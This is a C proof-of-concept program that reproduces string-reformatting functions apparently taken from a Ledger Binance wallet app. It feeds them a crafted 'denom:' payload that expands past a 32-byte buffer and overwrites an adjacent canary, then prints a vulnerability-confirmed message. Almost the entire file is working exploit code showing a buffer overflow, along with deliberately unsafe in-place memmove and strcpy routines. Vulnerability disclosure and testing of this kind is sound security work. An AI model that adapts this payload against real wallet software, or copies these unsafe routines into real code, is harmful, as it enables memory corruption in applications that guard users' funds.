#include <stdio.h>
#include <string.h>
#include <stdint.h>

typedef struct {
    int16_t item_index_to_display;
    char *key;
    char *value;
    uint8_t max_level;
    int16_t key_length;
    int16_t value_length;
    int16_t item_index;
    int16_t chunk_index;
} display_context_params_t;

#define DECIMAL_SCALE 8
#define ZERO_FRACTION "00000000"

int fixed8_str_conv(char *output, char *input, char terminator) {
    size_t input_len = strlen(input);
    if (strrchr(output, '.')) return 0;
    char tmp[DECIMAL_SCALE + 1];
    tmp[DECIMAL_SCALE] = '\0';
    if (input_len <= DECIMAL_SCALE) {
        strcpy(tmp, input);
        output[0] = '0';
        output[1] = '.';
        strcpy(&output[2], ZERO_FRACTION);
        int add_decs = DECIMAL_SCALE - strlen(tmp);
        strcpy(&output[2 + add_decs], tmp);
        output[input_len + 2 + add_decs] = terminator;
        return 1;
    }
    int input_dec_offset = input_len - DECIMAL_SCALE;
    strcpy(tmp, &input[input_dec_offset]);
    output[input_dec_offset] = '.';
    strncpy(output, input, input_len - DECIMAL_SCALE);
    strcpy(&output[input_dec_offset + 1], tmp);
    output[input_len + 1] = terminator;
    return 1;
}

char *replace_word(char *str, char *word, char *subst) {
    int len  = strlen(str);
    int lena = strlen(word), lenb = strlen(subst);
    for (char* p = str; (p = strstr(p, word)); ++p) {
        if (lena != lenb)
            memmove(p+lenb, p+lena, len - (p - str) + lenb);
        memcpy(p, subst, lenb);
    }
    return str;
}

char *replace_chrs(char *str, char *chrs, char *subst) {
    int16_t chrslen = strlen(chrs);
    char chr[2];
    chr[1] = '\0';
    for (int16_t i = 0; i < chrslen; i++) {
        int len  = strlen(str);
        int lensub = strlen(subst);
        chr[0] = *chrs;
        for (char* p = str; (p = strstr(p, chr)); ++p) {
            if (1 != lensub)
                memmove(p+lensub, p+1, len - (p - str) + lensub);
            memcpy(p, subst, lensub);
        }
        chrs++;
    }
    return str;
}

void reformat_coins(display_context_params_t *p) {
    replace_chrs(p->value, "[{}]\"", "");
    replace_word(p->value, "denom:", "         ");

    char *comma;
    char *amount = p->value;
    while ((amount = strstr(amount, "amount:")) != NULL) {
        comma = strchr(amount, ',');
        if (!comma) {
            break;
        }
        *comma = '\0';
        fixed8_str_conv(amount + 7, amount + 7, ' ');
        amount = comma;
    }

    replace_word(p->value, "amount:", "");
    replace_word(p->value, "  ", " ");
    replace_chrs(p->value, ",", ",  ");
}

// Memory layout simulation
struct {
    char buffer[32];
    char canary[16];
} mem;

int main() {
    memset(&mem, 0, sizeof(mem));
    strcpy(mem.canary, "SAFE_CANARY");

    // Craft a payload that fits in the 32 byte buffer but expands massively
    strcpy(mem.buffer, "denom:denom:denom:denom:");
    
    display_context_params_t ctx;
    ctx.value = mem.buffer;

    printf("--- Ledger App Binance: Memory Corruption PoC ---\n\n");
    printf("[*] Initial Memory State:\n");
    printf("    Buffer Address: %p\n", (void*)mem.buffer);
    printf("    Canary Address: %p\n", (void*)mem.canary);
    printf("    Buffer Content: '%s'\n", mem.buffer);
    printf("    Canary Content: '%s'\n\n", mem.canary);

    printf("[*] Triggering reformat_coins()...\n\n");
    reformat_coins(&ctx);

    printf("[*] Post-Execution Memory State:\n");
    printf("    Buffer Content: '%s'\n", mem.buffer);
    printf("    Canary Content: '%s'\n\n", mem.canary);

    if (strcmp(mem.canary, "SAFE_CANARY") != 0) {
        printf("[!] VULNERABILITY CONFIRMED: Canary overwritten due to Global Buffer Overflow!\n");
        return 1;
    } else {
        printf("[-] Canary intact.\n");
        return 0;
    }
}
